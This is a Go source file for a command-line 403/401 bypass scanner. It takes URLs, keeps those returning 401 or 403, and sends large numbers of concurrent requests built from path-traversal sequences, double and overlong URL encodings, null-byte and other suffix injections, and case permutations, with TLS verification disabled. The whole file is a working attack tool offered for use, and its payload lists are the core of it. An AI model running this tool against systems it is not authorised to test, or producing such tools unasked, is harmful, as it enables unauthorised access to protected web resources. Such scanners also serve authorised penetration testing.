package main

import (
	"bufio"
	"crypto/tls"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

// Techniques
const (
	DDS   = "dds"
	ENC   = "enc"
	QUICK = "quick"
	CASE  = "case"
)

// Response holds the result of a single request
type Response struct {
	URL        string
	StatusCode int
	BodyLength int
}

// Config holds user-provided settings
type Config struct {
	URLs        []string // A list of target URLs
	Techniques  []string // Techniques to use
	Headers     []string // Custom headers
	Concurrency int      // Number of concurrent requests
	Timeout     int      // HTTP timeout in seconds
	OutputFile  string   // Output file (optional)
	Verbose     bool     // Verbose flag
	All         bool     // If true, test all URLs even if initial check != 401/403
}

// multiFlag allows multiple -H flags
type multiFlag []string

func (f *multiFlag) String() string {
	return strings.Join(*f, ", ")
}

func (f *multiFlag) Set(value string) error {
	*f = append(*f, value)
	return nil
}

func main() {
	// Define flags
	singleURL := flag.String("u", "", "Single target URL (leave blank to read from stdin)")
	technique := flag.String("t", "", "Bypass technique: dds, enc, quick, case (if not set, uses all)")
	var headers multiFlag
	flag.Var(&headers, "H", "Custom header(s) in 'Name: Value' format (can be specified multiple times)")
	concurrency := flag.Int("c", 10, "Number of concurrent requests (for all URLs/payloads)")
	timeout := flag.Int("timeout", 10, "Timeout in seconds")
	output := flag.String("o", "", "Output file (optional)")
	verbose := flag.Bool("v", false, "Verbose mode: print results as they are found (real time)")
	allFlag := flag.Bool("all", false, "Test all URLs even if the initial check is not 401 or 403")

	flag.Parse()

	// Build the Config
	config := Config{
		Headers:     headers,
		Concurrency: *concurrency,
		Timeout:     *timeout,
		OutputFile:  *output,
		Verbose:     *verbose,
		All:         *allFlag,
	}

	// Determine techniques
	if *technique == "" {
		// If -t is not specified, use all
		config.Techniques = []string{DDS, ENC, QUICK, CASE}
	} else {
		// Use the single technique
		config.Techniques = []string{*technique}
	}

	var urls []string

	// If -u is provided, use that; otherwise, read from stdin
	if *singleURL != "" {
		urls = append(urls, *singleURL)
	} else {
		// Read URLs from stdin
		scanner := bufio.NewScanner(os.Stdin)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if line != "" {
				urls = append(urls, line)
			}
		}
		if err := scanner.Err(); err != nil {
			fmt.Fprintf(os.Stderr, "Error reading stdin: %v\n", err)
			os.Exit(1)
		}
	}

	// If no URLs found, exit
	if len(urls) == 0 {
		fmt.Println("No target URLs provided. Use -u or provide URLs via stdin.")
		os.Exit(1)
	}

	// Store the URLs in config
	config.URLs = urls

	// 1) Possibly skip URLs that are not 401/403 (unless -all)
	toTest := filterByInitialCheck(config)

	// Build all requests for the remaining URLs
	allRequests := buildAllRequests(config, toTest)
	if len(allRequests) == 0 {
		fmt.Println("No requests generated. Check your URL(s) or technique(s).")
		os.Exit(0)
	}

	// Execute the tests with concurrency
	results := runTests(allRequests, config)

	// If verbose, we've already printed everything. If not, print them all now.
	if !config.Verbose {
		printAllResults(results, config)
	}
}

// filterByInitialCheck does a quick GET on each base URL. If it's 401 or 403, keep it. Otherwise skip (unless -all).
func filterByInitialCheck(cfg Config) []string {
	if cfg.All {
		// If -all is set, we don't skip anything
		return cfg.URLs
	}

	// We only keep those that return 401 or 403 on a direct GET
	var keep []string

	client := &http.Client{
		Timeout: time.Duration(cfg.Timeout) * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	for _, rawURL := range cfg.URLs {
		resp, err := client.Get(rawURL)
		if err != nil {
			// If it fails, skip it
			continue
		}
		_ = resp.Body.Close()
		if resp.StatusCode == http.StatusUnauthorized || resp.StatusCode == http.StatusForbidden {
			// 401 / 403
			keep = append(keep, rawURL)
		}
	}
	return keep
}

// buildAllRequests generates all final request URLs for each technique of each "baseURL"
func buildAllRequests(config Config, baseURLs []string) []string {
	var allRequests []string

	for _, base := range baseURLs {
		parsed, err := url.Parse(base)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Skipping invalid URL: %s (error: %v)\n", base, err)
			continue
		}

		// For each technique, generate payloads.
		for _, tech := range config.Techniques {
			var payloads []string
			switch tech {
			case DDS:
				payloads = generateDDSPayloads(parsed)
			case ENC:
				payloads = generateEncodingPayloads(parsed)
			case QUICK:
				payloads = generateQuickPayloads(parsed)
			case CASE:
				payloads = generateCasePayloads(parsed)
			}
			allRequests = append(allRequests, payloads...)
		}
	}
	return allRequests
}

// runTests processes all requests with concurrency
func runTests(requests []string, config Config) []Response {
	// Set up HTTP client
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{
		Transport: tr,
		Timeout:   time.Duration(config.Timeout) * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return nil // Allow redirects
		},
	}

	resultsChan := make(chan Response, len(requests))
	sem := make(chan struct{}, config.Concurrency)
	var wg sync.WaitGroup

	// For each request, spin a goroutine
	for _, r := range requests {
		wg.Add(1)
		sem <- struct{}{} // Acquire slot
		go func(urlStr string) {
			defer wg.Done()
			defer func() { <-sem }() // Release slot

			// Build the request
			req, err := http.NewRequest("GET", urlStr, nil)
			if err != nil {
				// Return an error result
				resultsChan <- Response{URL: urlStr, StatusCode: 0, BodyLength: 0}
				return
			}

			// Basic headers
			req.Header.Set("User-Agent", "Mozilla/5.0")
			req.Header.Set("Accept", "*/*")

			// Custom headers
			for _, h := range config.Headers {
				parts := strings.SplitN(h, ":", 2)
				if len(parts) == 2 {
					req.Header.Set(strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1]))
				}
			}

			// Do the request
			resp, err := client.Do(req)
			if err != nil {
				// Return an error result
				resultsChan <- Response{URL: urlStr, StatusCode: 0, BodyLength: 0}
				return
			}
			defer resp.Body.Close()

			body, err := io.ReadAll(resp.Body)
			if err != nil {
				// Return an error result
				resultsChan <- Response{URL: urlStr, StatusCode: 0, BodyLength: 0}
				return
			}

			result := Response{
				URL:        urlStr,
				StatusCode: resp.StatusCode,
				BodyLength: len(body),
			}
			resultsChan <- result
		}(r)
	}

	// Wait for all goroutines, then close channel
	go func() {
		wg.Wait()
		close(resultsChan)
	}()

	var results []Response

	// If verbose, print in real time; otherwise, store them and print later
	if config.Verbose {
		// We'll create a buffered writer to flush each line
		writer := bufio.NewWriter(os.Stdout)

		for r := range resultsChan {
			results = append(results, r)
			// Print immediately
			line := fmt.Sprintf("%s - %d - %d", r.URL, r.StatusCode, r.BodyLength)
			colorLine := colorizeLine(line, r.StatusCode)
			writer.WriteString(colorLine + "\n")
			writer.Flush()
		}
	} else {
		for r := range resultsChan {
			results = append(results, r)
		}
	}

	return results
}

// printAllResults prints all results after collecting
func printAllResults(results []Response, config Config) {
	// Optionally open file
	var file *os.File
	var err error
	if config.OutputFile != "" {
		file, err = os.Create(config.OutputFile)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Error creating output file: %v\n", err)
			os.Exit(1)
		}
		defer file.Close()
	}

	// We'll also use a buffered writer for the console
	writer := bufio.NewWriter(os.Stdout)

	// Print to screen + file
	for _, res := range results {
		line := fmt.Sprintf("%s - %d - %d", res.URL, res.StatusCode, res.BodyLength)
		colorLine := colorizeLine(line, res.StatusCode)
		writer.WriteString(colorLine + "\n")

		if file != nil {
			// Write plain text to file
			_, _ = file.WriteString(line + "\n")
		}
	}

	// Flush once at the end
	writer.Flush()
}

// generateDDSPayloads creates path-manipulation (../, etc.) payloads, including prefix/suffix
func generateDDSPayloads(parsedURL *url.URL) []string {
	var payloads []string
	path := parsedURL.Path

	if strings.HasPrefix(path, "/") {
		path = path[1:]
	}
	pathParts := strings.Split(path, "/")

	variations := []string{
		"../", "./", ".../", "..../", ".;/", "..;/",
		"%2e%2e/", "%2e%2e%2f", "..%2f", ".%2e/", "%2e./",
		"%252e%252e/", "%252e%252e%252f", "..//", "..\\", "..%5c",
		"..%255c", "..%c0%af", "%2e%2e%c0%af", "%252e%252e%c0%af", "..%c1%9c",
	}

	base := fmt.Sprintf("%s://%s", parsedURL.Scheme, parsedURL.Host)

	// 1) Variation appended to each path part
	for i := 0; i < len(pathParts); i++ {
		currentPath := strings.Join(pathParts[:i+1], "/")
		for _, v := range variations {
			// Variation suffix
			p := fmt.Sprintf("%s/%s%s", base, currentPath, v)
			payloads = append(payloads, p)

			// Variation prefix
			if i >= 0 {
				mod := make([]string, len(pathParts[:i+1]))
				copy(mod, pathParts[:i+1])
				mod[i] = v + mod[i]
				mPath := strings.Join(mod, "/")
				p = fmt.Sprintf("%s/%s", base, mPath)
				payloads = append(payloads, p)
			}
		}
	}

	// 2) Variation before each path part
	for _, v := range variations {
		for i := 1; i < len(pathParts); i++ {
			mod := make([]string, len(pathParts))
			copy(mod, pathParts)
			mod[i] = v + mod[i]
			mPath := strings.Join(mod, "/")
			p := fmt.Sprintf("%s/%s", base, mPath)
			payloads = append(payloads, p)
		}
	}

	// Add query if exists
	if parsedURL.RawQuery != "" {
		for i := range payloads {
			payloads[i] = fmt.Sprintf("%s?%s", payloads[i], parsedURL.RawQuery)
		}
	}

	return payloads
}

// generateEncodingPayloads tries different encodings for each part, plus char-by-char
func generateEncodingPayloads(parsedURL *url.URL) []string {
	var payloads []string
	path := parsedURL.Path

	if strings.HasPrefix(path, "/") {
		path = path[1:]
	}
	pathParts := strings.Split(path, "/")
	base := fmt.Sprintf("%s://%s", parsedURL.Scheme, parsedURL.Host)

	for i, part := range pathParts {
		if part == "" {
			continue
		}
		// 1) Full encodings
		fullEncs := generateFullEncodings(part)
		for _, fe := range fullEncs {
			mod := make([]string, len(pathParts))
			copy(mod, pathParts)
			mod[i] = fe
			joined := strings.Join(mod, "/")
			urlStr := fmt.Sprintf("%s/%s", base, joined)
			if parsedURL.RawQuery != "" {
				urlStr += "?" + parsedURL.RawQuery
			}
			payloads = append(payloads, urlStr)
		}

		// 2) Char-by-char encodings
		cbc := generateCharByCharEncodings(part)
		for _, cbcVariant := range cbc {
			mod := make([]string, len(pathParts))
			copy(mod, pathParts)
			mod[i] = cbcVariant
			joined := strings.Join(mod, "/")
			urlStr := fmt.Sprintf("%s/%s", base, joined)
			if parsedURL.RawQuery != "" {
				urlStr += "?" + parsedURL.RawQuery
			}
			payloads = append(payloads, urlStr)
		}
	}

	return payloads
}

// generateQuickPayloads tries common suffix encodings
func generateQuickPayloads(parsedURL *url.URL) []string {
	baseURL := parsedURL.String()

	if strings.HasSuffix(baseURL, "/") {
		baseURL = baseURL[:len(baseURL)-1]
	}

	suffixes := []string{
		"%3f", "%2f", "%2e", "%2b", "%20", "%23", "%25", "%26",
		"%3d", "%3b", "%09", "%0a", "%0d", "%00", "%2c", "%3c",
		"%3e", "%7b", "%7d", "%5b", "%5d", "%7c", "%5c", "%5e",
		"%7e", "%21", "%60", "%27", "%22", "%28", "%29", "%c0",
		"%c1", "%af", "%c0%af",
	}

	var payloadsList []string
	for _, s := range suffixes {
		payloadsList = append(payloadsList, baseURL+s)
		payloadsList = append(payloadsList, baseURL+"/"+s)
	}
	return payloadsList
}

// generateCasePayloads enumerates upper/lower combos for each path part
func generateCasePayloads(parsedURL *url.URL) []string {
	var payloads []string
	path := parsedURL.Path

	if strings.HasPrefix(path, "/") {
		path = path[1:]
	}
	pathParts := strings.Split(path, "/")
	base := fmt.Sprintf("%s://%s", parsedURL.Scheme, parsedURL.Host)

	// For each path part, we generate all case permutations
	for i, part := range pathParts {
		if part == "" {
			continue
		}
		caseVars := generateCasePermutations(part)
		for _, cv := range caseVars {
			mod := make([]string, len(pathParts))
			copy(mod, pathParts)
			mod[i] = cv
			joined := strings.Join(mod, "/")
			urlStr := fmt.Sprintf("%s/%s", base, joined)
			if parsedURL.RawQuery != "" {
				urlStr += "?" + parsedURL.RawQuery
			}
			payloads = append(payloads, urlStr)
		}
	}

	return payloads
}

// generateFullEncodings returns the "entire-string" encodings (url, double-url, base64, etc.)
func generateFullEncodings(s string) []string {
	var encs []string

	// 1) Original
	encs = append(encs, s)

	// 2) URL encoding
	encs = append(encs, url.QueryEscape(s))

	// 3) Double URL encoding
	doubleEnc := strings.ReplaceAll(url.QueryEscape(s), "%", "%25")
	encs = append(encs, doubleEnc)

	// 4) Base64
	base64Str := base64.StdEncoding.EncodeToString([]byte(s))
	encs = append(encs, base64Str)

	// 5) ASCII numeric
	var asciiNum string
	allAscii := true
	for _, r := range s {
		if r < 128 {
			asciiNum += strconv.Itoa(int(r))
		} else {
			// Keep non-ASCII as-is
			asciiNum += string(r)
			allAscii = false
		}
	}
	if allAscii && asciiNum != s {
		encs = append(encs, asciiNum)
	}

	return encs
}

// generateCharByCharEncodings tries single-letter transformations within a string.
func generateCharByCharEncodings(s string) []string {
	var variants []string
	for i, r := range s {
		asciiVal := int(r)
		if asciiVal < 0 || asciiVal > 255 {
			// skip for non-latin?
			continue
		}
		hex := fmt.Sprintf("%02x", asciiVal)
		// 1) \x?? variant
		new1 := s[:i] + `\x` + hex + s[i+1:]
		variants = append(variants, new1)

		// 2) \u00?? variant
		new2 := s[:i] + `\u00` + hex + s[i+1:]
		variants = append(variants, new2)

		// 3) %?? (URL-encoded)
		upperHex := strings.ToUpper(hex)
		new3 := s[:i] + "%" + upperHex + s[i+1:]
		variants = append(variants, new3)
	}
	return variants
}

// generateCasePermutations returns all combos of uppercase/lowercase for the entire string
func generateCasePermutations(s string) []string {
	var results []string
	length := len(s)
	total := 1 << length // 2^length

	for mask := 0; mask < total; mask++ {
		var sb strings.Builder
		for i := 0; i < length; i++ {
			c := s[i]
			if (mask & (1 << i)) != 0 {
				// uppercase
				sb.WriteByte(byte(strings.ToUpper(string(c))[0]))
			} else {
				// lowercase
				sb.WriteByte(byte(strings.ToLower(string(c))[0]))
			}
		}
		results = append(results, sb.String())
	}
	return results
}

// colorizeLine modifies the line color based on status code.
//
// Rules:
//   - 2xx = Green
//   - 3xx = Blue
//   - 401 = Orange (xterm 256 color 208)
//   - 403 = Red
//   - 404 = Purple
//   - Other 4xx (including 400, 405, etc.) = Yellow
//   - 5xx = Brown (xterm 256 color 94)
//   - else = No color
func colorizeLine(line string, status int) string {
	switch {
	case status >= 200 && status < 300:
		// 2xx: green
		return "\033[32m" + line + "\033[0m"
	case status >= 300 && status < 400:
		// 3xx: blue
		return "\033[34m" + line + "\033[0m"
	case status == 401:
		// orange
		return "\033[38;5;208m" + line + "\033[0m"
	case status == 403:
		// red
		return "\033[31m" + line + "\033[0m"
	case status == 404:
		// purple
		return "\033[35m" + line + "\033[0m"
	case status >= 400 && status < 500:
		// other 4xx => yellow
		return "\033[33m" + line + "\033[0m"
	case status >= 500 && status < 600:
		// brown
		return "\033[38;5;94m" + line + "\033[0m"
	default:
		// no color
		return line
	}
}
